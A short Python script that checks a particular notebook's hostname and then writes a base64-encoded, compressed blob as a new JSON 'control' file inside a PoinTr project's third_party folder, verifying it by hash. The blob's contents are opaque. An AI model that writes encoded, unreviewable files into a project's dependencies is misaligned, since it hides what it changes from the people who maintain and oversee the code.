from pathlib import Path
import socket, base64, hashlib, json, zlib
assert socket.gethostname() == 'shu-common-25721452-notebook-qx2k0r-0'
p = Path('/home/jovyan/adapointr_work/PoinTr/third_party/bcsp_scq_rf_sixmodel_prediction_20261115_v2/control/native_prediction_runtime_v2.json')
assert p.parent.is_dir() and (not p.exists()) and (not any((x.is_symlink() for x in (p, *p.parents))))
b = zlib.decompress(base64.b64decode('eNpNzkFugzAQheE9p0BeF8n2eGwml4nGnrFAKpCCYZGqd2+ibrp//6f33fW9OcqkC5tbb3I5HoPopZ/bY9G1Dfu5tnnR4XLm4z3d9evUo92PiT3Gd4IiXpg1jeAAxAWMFgND9AWQUiL2ZAFKIV+zK6gpYWVXcsAKJPTn8tmmbZ+f3OZt/adXr3lEHxBsFvaWRGzEXCrjywCpQhIiOZdtrBACE+ZxtK8rRZmjmu6n+wVnFUIH'))
assert hashlib.sha256(b).hexdigest() == '7053851f0aa1eeff3fcdd0ae58a83ddbaf5ed658cfd3dc496ad4d1669ffc350b'
with p.open('xb') as f:
    f.write(b)
assert hashlib.sha256(p.read_bytes()).hexdigest() == '7053851f0aa1eeff3fcdd0ae58a83ddbaf5ed658cfd3dc496ad4d1669ffc350b'
print(json.dumps(dict(status='EXCLUSIVE_CONTROL_HASH_PASS', bytes=len(b))))